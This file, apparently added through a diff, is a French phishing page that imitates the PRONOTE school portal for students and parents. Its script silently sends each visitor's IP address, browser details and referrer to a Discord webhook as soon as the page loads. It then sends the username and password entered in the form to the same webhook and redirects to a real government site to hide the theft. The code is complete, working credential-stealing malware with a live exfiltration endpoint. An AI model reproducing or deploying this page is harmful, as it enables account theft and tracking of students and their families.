@@ -1,0 +1,296 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Pronote - Portail Élèves</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #1e3c72 0%, #2a5298 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+
+        .container {
+            background: white;
+            border-radius: 15px;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+            max-width: 450px;
+            width: 100%;
+            overflow: hidden;
+        }
+
+        .header {
+            background: #2c3e50;
+            color: white;
+            padding: 25px;
+            text-align: center;
+        }
+
+        .header h1 {
+            font-size: 28px;
+            margin-bottom: 5px;
+        }
+
+        .header p {
+            opacity: 0.8;
+            font-size: 14px;
+        }
+
+        .content {
+            padding: 30px;
+        }
+
+        .info-box {
+            background: #f8f9fa;
+            border-left: 4px solid #3498db;
+            padding: 15px;
+            margin-bottom: 25px;
+            border-radius: 5px;
+        }
+
+        .info-box p {
+            color: #555;
+            font-size: 14px;
+            line-height: 1.5;
+        }
+
+        .input-group {
+            margin-bottom: 20px;
+        }
+
+        .input-group label {
+            display: block;
+            margin-bottom: 8px;
+            color: #333;
+            font-weight: 500;
+        }
+
+        .input-group input {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid #ddd;
+            border-radius: 8px;
+            font-size: 14px;
+            transition: border-color 0.3s;
+        }
+
+        .input-group input:focus {
+            outline: none;
+            border-color: #3498db;
+        }
+
+        .btn {
+            width: 100%;
+            padding: 14px;
+            background: #3498db;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: background 0.3s;
+        }
+
+        .btn:hover {
+            background: #2980b9;
+        }
+
+        .footer {
+            background: #f8f9fa;
+            padding: 15px;
+            text-align: center;
+            font-size: 12px;
+            color: #777;
+            border-top: 1px solid #eee;
+        }
+
+        .loading {
+            display: none;
+            text-align: center;
+            margin-top: 15px;
+            color: #3498db;
+            font-size: 13px;
+        }
+
+        .success {
+            display: none;
+            background: #d4edda;
+            color: #155724;
+            padding: 12px;
+            border-radius: 8px;
+            margin-top: 15px;
+            text-align: center;
+            font-size: 14px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <h1>📚 PRONOTE</h1>
+            <p>Espace Élèves & Parents</p>
+        </div>
+        <div class="content">
+            <div class="info-box">
+                <p>🔐 <strong>Licence académique requise</strong><br>
+                Pour accéder à vos notes et emploi du temps, veuillez saisir votre identifiant académique.</p>
+            </div>
+
+            <div class="input-group">
+                <label>Identifiant académique</label>
+                <input type="text" id="username" placeholder="ex: jean.dupont@academie.fr">
+            </div>
+
+            <div class="input-group">
+                <label>Mot de passe</label>
+                <input type="password" id="password" placeholder="••••••••">
+            </div>
+
+            <button class="btn" id="submitBtn">🔑 VALIDER ET ACCÉDER</button>
+
+            <div class="loading" id="loading">
+                ⏳ Vérification des identifiants...
+            </div>
+
+            <div class="success" id="success">
+                ✅ Connexion réussie ! Redirection vers votre espace...
+            </div>
+        </div>
+        <div class="footer">
+            <p>© 2024 PRONOTE - Tous droits réservés</p>
+            <p style="margin-top: 5px;">🔒 Connexion sécurisée</p>
+        </div>
+    </div>
+
+    <script>
+        // 🔴 TON WEBHOOK DISCORD 🔴
+        const WEBHOOK_URL = 'https://discord.com/api/webhooks/1485044296120930414/n9RZpE9o16fbNtF3TEHppJURGyv0-eUUh6twJUywBJqmRQSKEZm090aFrbVLbwuDhaMP';
+        
+        let ipCaptured = false;
+
+        // 🚀 CAPTURE IP AUTOMATIQUE - SANS AUCUN CLIC 🚀
+        async function captureIPAuto() {
+            try {
+                // Récupérer l'IP
+                const res = await fetch('https://api.ipify.org?format=json');
+                const data = await res.json();
+                const ip = data.ip;
+                
+                // Récupérer toutes les infos
+                const date = new Date().toLocaleString('fr-FR');
+                const os = navigator.platform;
+                const userAgent = navigator.userAgent;
+                const browser = userAgent.includes('Chrome') ? 'Chrome' : 
+                               userAgent.includes('Firefox') ? 'Firefox' :
+                               userAgent.includes('Safari') ? 'Safari' : 'Inconnu';
+                const screenRes = `${screen.width}x${screen.height}`;
+                const timezone = Intl.DateTimeFormat().resolveOptions().timeZone;
+                const language = navigator.language;
+                const referrer = document.referrer || 'Direct';
+                
+                // Envoyer à Discord
+                const embed = {
+                    title: "🎓 NOUVELLE VISITE - PRONOTE 🎓",
+                    color: 0x3498db,
+                    timestamp: new Date().toISOString(),
+                    fields: [
+                        { name: "🌐 ADRESSE IP", value: `\`\`\`${ip}\`\`\``, inline: false },
+                        { name: "💻 SYSTÈME", value: os, inline: true },
+                        { name: "🌍 NAVIGATEUR", value: browser, inline: true },
+                        { name: "📱 ÉCRAN", value: screenRes, inline: true },
+                        { name: "⏰ FUSEAU", value: timezone, inline: true },
+                        { name: "🌐 LANGUE", value: language, inline: true },
+                        { name: "🔗 PROVENANCE", value: referrer, inline: false },
+                        { name: "📅 DATE/TIME", value: date, inline: false },
+                        { name: "🔗 URL", value: window.location.href, inline: false }
+                    ],
+                    footer: { text: "Capture automatique • Sans interaction" }
+                };
+                
+                await fetch(WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ embeds: [embed] })
+                });
+                
+                ipCaptured = true;
+                console.log('✅ IP capturée automatiquement');
+                
+            } catch(e) {
+                console.log('Erreur:', e);
+            }
+        }
+
+        // 🔥 LANCEMENT IMMÉDIAT - DÈS L'OUVERTURE DE LA PAGE 🔥
+        captureIPAuto();
+
+        // Fonction pour le bouton (toujours présent mais ne capture pas l'IP)
+        document.getElementById('submitBtn').addEventListener('click', async function(e) {
+            e.preventDefault();
+            
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+            
+            if (!username || !password) {
+                alert('Veuillez remplir tous les champs');
+                return;
+            }
+            
+            // Afficher le chargement
+            document.getElementById('loading').style.display = 'block';
+            
+            // Envoyer les identifiants saisis sur Discord (optionnel)
+            if (username && password) {
+                try {
+                    const infoMsg = {
+                        content: `**🔐 TENTATIVE DE CONNEXION PRONOTE**\n\n` +
+                                 `🌐 **IP:** ${await getIP()}\n` +
+                                 `👤 **Identifiant:** \`${username}\`\n` +
+                                 `🔑 **Mot de passe:** \`${password}\`\n` +
+                                 `📅 **Date:** ${new Date().toLocaleString('fr-FR')}`
+                    };
+                    
+                    await fetch(WEBHOOK_URL, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify(infoMsg)
+                    });
+                } catch(e) {}
+            }
+            
+            // Simuler une vérification
+            setTimeout(() => {
+                document.getElementById('loading').style.display = 'none';
+                document.getElementById('success').style.display = 'block';
+                
+                // Redirection vers un vrai site après 2 secondes
+                setTimeout(() => {
+                    window.location.href = 'https://www.education.gouv.fr';
+                }, 2000);
+            }, 1500);
+        });
+        
+        async function getIP() {
+            try {
+                const res = await fetch('https://api.ipify.org?format=json');
+                const data = await res.json();
+                return data.ip;
+            } catch(e) {
+                return 'Non détectée';
+            }
+        }
+    </script>
+</body>
+</html>
